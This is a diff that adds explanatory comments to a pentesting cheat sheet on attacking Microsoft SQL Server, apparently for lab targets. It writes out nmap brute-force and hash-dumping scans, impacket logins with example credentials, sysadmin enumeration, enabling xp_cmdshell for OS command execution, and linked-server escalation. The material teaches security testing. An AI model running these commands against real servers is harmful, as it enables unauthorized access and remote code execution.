@@ -61,6 +61,7 @@
 ```bash
 locate mssqlclient
 ```
+> Finds the path to `mssqlclient.py` on the system. On Kali, it's at `/usr/bin/impacket-mssqlclient`. The script is the primary MSSQL attack client for pentesters.
 
 ```
 /usr/bin/impacket-mssqlclient
@@ -160,6 +161,7 @@ Nmap has default MSSQL scripts targeting the default TCP port 1433.
 # Comprehensive MSSQL enumeration
 sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <target>
 ```
+> Runs a full battery of MSSQL NSE scripts. `ms-sql-ntlm-info` extracts hostname and domain via NTLM challenge. `ms-sql-empty-password` checks if `sa` has a blank password. `ms-sql-xp-cmdshell` tests if OS command execution is enabled. Replace `<target>` with the target IP.
 
 **Example Output:**
 
@@ -208,6 +210,7 @@ msf6 > use auxiliary/scanner/mssql/mssql_ping
 msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
 msf6 auxiliary(scanner/mssql/mssql_ping) > run
 ```
+> The `mssql_ping` scanner enumerates MSSQL instance details via UDP 1434 (SQL Browser service). It reveals the server name, instance name, version, and whether named pipes are enabled — all without credentials. Replace `10.129.201.248` with your target IP.
 
 **Example Output:**
 
@@ -233,6 +236,7 @@ If credentials are obtained, use Impacket's mssqlclient.py to connect and intera
 # Connect with Windows authentication
 python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
 ```
+> `-windows-auth` uses Windows domain authentication (Kerberos/NTLM) instead of SQL logins. Once connected, you get a `SQL>` prompt where you can run T-SQL queries. Replace `Administrator@10.129.201.248` with your username and target IP.
 
 **Example Session:**
 
@@ -282,6 +286,7 @@ nmap -p 1433 --script ms-sql-dac <target>
 # Full MSSQL enumeration
 nmap -p 1433 --script ms-sql-* <target>
 ```
+> Individual MSSQL NSE scripts for targeted checks. `ms-sql-empty-password` and `ms-sql-brute` can be run without credentials. `ms-sql-*` runs all MSSQL scripts at once. Replace `<target>` with the target IP.
 
 ### Connect with Impacket's mssqlclient.py
 
@@ -295,6 +300,7 @@ impacket-mssqlclient <domain>/<username>:<password>@<target> -windows-auth
 # Example
 impacket-mssqlclient sa:password123@10.10.10.10
 ```
+> `impacket-mssqlclient` supports both SQL authentication and Windows authentication. Once connected, type `help` to see extra shell commands. Replace usernames, passwords, and target IP with your values.
 
 ---
 
@@ -321,6 +327,7 @@ SELECT CURRENT_USER;
 -- Get server name
 SELECT @@SERVERNAME;
 ```
+> Basic T-SQL recon commands. Run these immediately after connecting to map the database. `SELECT @@version` reveals the SQL Server version for CVE research. `information_schema.tables` lists all tables in the selected database.
 
 ### User Enumeration
 
@@ -331,6 +338,7 @@ SELECT name FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';
 -- List sysadmin members
 SELECT name FROM sys.server_principals WHERE is_srvrolemember('sysadmin', name) = 1;
 ```
+> Shows all SQL logins and which ones have `sysadmin` rights. If your current user appears in the sysadmin list, you can enable `xp_cmdshell` for OS command execution.
 
 ---
 
@@ -354,6 +362,7 @@ RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 EXEC xp_cmdshell 'dir C:\';
 ```
+> `xp_cmdshell` is a stored procedure that runs OS commands. It's disabled by default but can be re-enabled by a `sysadmin`. First enable "show advanced options", then enable `xp_cmdshell`, then `EXEC xp_cmdshell 'command'` to run anything on the OS. This gives you Remote Code Execution (RCE) as the SQL Server service account.
 
 > ⚠️ **High Impact:** `xp_cmdshell` enables RCE on the database server!
 
@@ -366,6 +375,7 @@ SELECT * FROM sys.servers;
 -- Execute queries on linked server
 SELECT * FROM OPENQUERY("LinkedServerName", 'SELECT @@version');
 ```
+> Linked servers let one SQL Server execute queries on another. If the linked server runs queries with elevated privileges, you may be able to escalate from a low-privilege account by running commands through the link. Always enumerate linked servers when you have any MSSQL access.
 
 ---
 
